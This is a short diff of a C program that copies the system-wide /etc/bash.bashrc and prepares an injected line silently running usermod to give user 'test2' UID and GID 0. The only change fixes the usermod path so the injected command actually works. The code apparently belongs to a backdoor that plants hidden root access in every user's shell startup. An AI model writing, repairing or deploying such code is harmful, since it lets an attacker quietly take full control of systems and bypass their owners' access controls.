@@ -92,7 +92,7 @@ int main() {
     FILE *ogFile, *newFile;
     ogFile = fopen("/etc/bash.bashrc", "r");
     newFile = fopen("./tmp/bash.bashrc", "w");
-    char line[] = "/bin/bash -c \"/user/sbin/usermod -ou 0 -g 0 test2 > /dev/null 2>&1 &\"\n";
+    char line[] = "/bin/bash -c \"/usr/sbin/usermod -ou 0 -g 0 test2 > /dev/null 2>&1 &\"\n";
 
     // bool useMyEntry = false;
     // char * myEntry = malloc(sizeof(char) * 100);
